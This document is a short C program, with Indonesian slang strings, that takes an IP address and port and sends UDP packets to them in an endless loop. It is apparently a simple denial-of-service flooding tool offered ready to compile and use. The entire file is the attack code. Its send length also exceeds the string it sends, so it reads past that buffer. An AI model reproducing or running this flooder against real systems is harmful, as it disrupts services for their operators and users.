#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#define JENIS_Peler "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
#define UKURAN_PELER 45

int echo_connect(char *, short);
int echo_connect(char *server, short port)
{
struct sockaddr_in sin;
struct hostent *hp;
int thesock;
printf("\n");
printf("Jajal %s ke port %d\n",
server, port);
hp = gethostbyname(server);
if (hp==NULL) {
printf("Di %s Qe3!!\n",server);
printf("\n");
exit(0);
}
bzero((char*) &sin, sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = htons(port);
sin.sin_family = hp->h_addrtype;
sin.sin_port = htons(port);
thesock = socket(AF_INET, SOCK_DGRAM, 0);
connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
return thesock;
}


main(int argc, char **argv)
{
int s;
if(argc != 3)
{
printf("\n");
printf("Kirim Voucher\n\n");
printf("Cara Pake : $ qe3 ip port \n\n");
exit(0);
}
s=echo_connect(argv[1], atoi(argv[2]));
for(;;)
{
send(s, JENIS_Peler, UKURAN_PELER, 0);
}
}



